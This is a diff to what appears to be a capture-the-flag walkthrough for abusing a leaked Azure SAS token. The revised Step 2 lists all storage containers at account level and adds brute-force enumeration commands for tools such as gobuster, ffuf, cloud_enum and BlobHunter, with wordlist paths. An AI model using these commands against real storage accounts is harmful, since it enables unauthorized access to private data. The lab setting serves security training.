@@ -42,25 +42,33 @@ curl <app_js_url>
 
 Extract the value of `SAS_TOKEN` (the full query string starting with `?sv=`).
 
-### Step 2 — List the private container
+### Step 2 — Enumerate containers
+
+The SAS token has service-level list permission — use it to enumerate all containers directly:
 
 ```bash
 ACCOUNT="<storage_account_name>"
 SAS="<extracted_sas_token>"   # starts with ?sv=
 
-curl "https://${ACCOUNT}.blob.core.windows.net/secrets?restype=container&comp=list&${SAS:1}"
-# Note: strip the leading '?' since we append after '?restype=...'
+curl "https://${ACCOUNT}.blob.core.windows.net/?restype=account&comp=list&${SAS:1}"
 ```
 
-Or simply use the Azure CLI:
+If listing were restricted, you would brute-force container names instead.
+Common tools and wordlists for Azure Blob Storage container enumeration:
 
-```bash
-az storage blob list \
-  --account-name <account> \
-  --container-name secrets \
-  --sas-token "<sas_token>" \
-  --query "[].name" -o tsv
-```
+| Tool | Example command |
+|------|----------------|
+| **gobuster** | `gobuster fuzz -u "https://<account>.blob.core.windows.net/FUZZ?restype=container&comp=list" -w containers.txt -b 404` |
+| **ffuf** | `ffuf -u "https://<account>.blob.core.windows.net/FUZZ?restype=container" -w containers.txt -fc 404` |
+| **cloudbrute** | `cloudbrute -d <account>.blob.core.windows.net -w containers.txt -service azure` |
+| **cloud_enum** | `./cloud_enum.py -k <account> --disable-aws --disable-gcp` |
+| **BlobHunter** | `python BlobHunter.py -a <account>` |
+| **wfuzz** | `wfuzz -c -z file,containers.txt --hc 404 "https://<account>.blob.core.windows.net/FUZZ?restype=container"` |
+
+Recommended wordlists from [SecLists](https://github.com/danielmiessler/SecLists):
+- `Discovery/Cloud/azure-storage-containers.txt`
+- `Discovery/Web-Content/common.txt`
+- `Discovery/DNS/subdomains-top1million-5000.txt`
 
 ### Step 3 — Read the flag
 
